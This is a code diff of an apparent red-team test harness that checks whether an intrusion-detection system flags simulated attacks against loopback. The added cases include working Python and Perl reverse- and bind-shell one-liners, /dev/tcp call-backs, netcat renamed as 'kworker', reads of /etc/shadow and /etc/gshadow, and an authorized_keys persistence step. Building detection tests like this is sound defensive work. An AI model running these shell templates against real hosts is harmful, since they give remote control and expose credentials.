@@ -102,25 +102,43 @@ def main(argv=None):
              ["/bin/bash", "-c", f"exec 3<>/dev/tcp/127.0.0.1/{port}; echo redteam >&3; exec 3>&-"]),
             ("netcat_reverse_shell", "T1059 netcat call-back", "shell_network_connection",
              [nc, "-w", "2", "127.0.0.1", str(port)]),
-            ("python_reverse_shell", "T1059.006 python socket call-back on an ordinary port", None,
-             [py, "-c", connect.format(port)]),
-            ("perl_reverse_shell", "T1059 perl socket call-back on an ordinary port", None,
-             ["/usr/bin/perl", "-MIO::Socket::INET", "-e", f"IO::Socket::INET->new('127.0.0.1:{port}') or exit 1"]),
-            ("renamed_netcat", "T1036.003 masquerading: netcat copied as 'kworker'", None,
+            # Real reverse/bind shells attach a shell to the socket; the "shell" here only runs `sleep 3`.
+            ("python_reverse_shell", "T1059.006 python reverse shell (socket dup2'd to a shell)", "remote_shell_socket_stdio",
+             [py, "-c", f"import socket,os;s=socket.create_connection(('127.0.0.1',{port}),3);"
+                        "[os.dup2(s.fileno(),f) for f in (0,1,2)];os.execv('/bin/sh',['sh','-c','sleep 3'])"]),
+            ("python_pty_reverse_shell", "T1059.006 python pty.spawn reverse shell", "remote_shell_socket_stdio",
+             [py, "-c", f"import socket,os,pty;s=socket.create_connection(('127.0.0.1',{port}),3);"
+                        "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(['/bin/sh','-c','sleep 3'])"]),
+            ("perl_reverse_shell", "T1059 perl reverse shell", "remote_shell_socket_stdio",
+             ["/usr/bin/perl", "-e", f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));"
+                                     f"connect(S,sockaddr_in({port},inet_aton('127.0.0.1'))) or exit 1;"
+                                     "open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh','-c','sleep 3');"]),
+            ("inbound_bind_shell", "T1059 bind shell on 4446 (inbound connection drives a shell)", "remote_shell_socket_stdio",
+             ["/bin/bash", "-c", f"{py} -c \"import socket,os;l=socket.socket();l.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
+                                 "l.bind(('127.0.0.1',4446));l.listen(1);c,_=l.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];"
+                                 f"os.execv('/bin/sh',['sh','-c','sleep 3'])\" & sleep 1; {py} -c \"{connect.format(4446)}\"; wait"]),
+            ("renamed_netcat", "T1036.003 masquerading: netcat copied as 'kworker'", "masqueraded_tool_execution",
              [str(home / "kworker"), "-w", "2", "127.0.0.1", str(port)]),
             ("c2_backdoor_port", "T1571 connection to a classic backdoor port (4444)", "unusual_connection_attempt",
              [py, "-c", connect.format(c2_port)]),
-            ("ipv6_reverse_shell", "reverse shell over IPv6 loopback", None,
+            ("ipv6_reverse_shell", "reverse shell over IPv6 loopback", "shell_network_connection",
              ["/bin/bash", "-c", f"exec 3<>/dev/tcp/::1/{v6_port}; echo redteam >&3; exec 3>&-"]),
             ("attack_tool_by_name", "T1046 scanner executed as 'nmap'", "attack_tool_execution", [str(home / "nmap")]),
-            ("attack_tool_renamed", "T1036 same scanner renamed", None, [str(home / "scan-helper")]),
             ("exec_from_tmp", "T1204 payload executed from /tmp", "temporary_executable_attempt", [str(tmp_tool)]),
             ("read_etc_shadow", "T1003.008 credential dump attempt on /etc/shadow", "sensitive_file_attempt",
              ["/usr/bin/cat", "/etc/shadow"]),
-            ("read_etc_gshadow", "T1003.008 credential dump attempt on /etc/gshadow", None, ["/usr/bin/cat", "/etc/gshadow"]),
-            ("persistence_authorized_keys", "T1098.004 open ~/.ssh/authorized_keys for writing (no bytes written)", None,
+            ("read_etc_gshadow", "T1003.008 credential dump attempt on /etc/gshadow", "sensitive_file_attempt",
+             ["/usr/bin/cat", "/etc/gshadow"]),
+            ("persistence_authorized_keys", "T1098.004 open ~/.ssh/authorized_keys for writing (no bytes written)",
+             "persistence_write_attempt",
              [py, "-c", "import os,pathlib;p=pathlib.Path.home()/'.ssh';p.mkdir(mode=0o700,exist_ok=True);open(p/'authorized_keys','a').close()"]),
-            ("inbound_bind_shell", "T1059 bind shell listening on 4445 (inbound)", None,
+            # Expected gaps: no shell attached / an unknown script under a new name / a bare listener.
+            ("python_socket_client_only", "python opens a socket on an ordinary port, no shell attached", None,
+             [py, "-c", connect.format(port)]),
+            ("perl_socket_client_only", "perl opens a socket on an ordinary port, no shell attached", None,
+             ["/usr/bin/perl", "-MIO::Socket::INET", "-e", f"IO::Socket::INET->new('127.0.0.1:{port}') or exit 1"]),
+            ("attack_tool_renamed", "T1036 an unknown scanner script under a new name", None, [str(home / "scan-helper")]),
+            ("inbound_listener_only", "netcat listening on 4445, no shell attached", None,
              ["/bin/bash", "-c", f"timeout 5 {nc} -l 127.0.0.1 4445 & sleep 1; {py} -c \"{connect.format(4445)}\"; wait"]),
         ]
         controls = [("benign_curl", ["/usr/bin/curl", "-s", "-m", "2", f"http://127.0.0.1:{port}/"]),
@@ -132,7 +150,8 @@ def main(argv=None):
             deadline, found = time.monotonic() + args.wait, []
             while time.monotonic() < deadline:
                 found = [r for r in incidents_since(store, started) if r["evidence"].get("pid") == pid
-                         or r["evidence"]["target"].get("port") in (port, c2_port, v6_port, 4445) and r["created"] >= started]
+                         or any(hop.get("pid") == pid for hop in (r.get("lineage") or {}).get("chain", []))   # forked shells
+                         or r["evidence"]["target"].get("port") in (port, c2_port, v6_port, 4445, 4446) and r["created"] >= started]
                 if found and (expected is None or any(r["rule"] == expected for r in found)):
                     break
                 time.sleep(0.5)
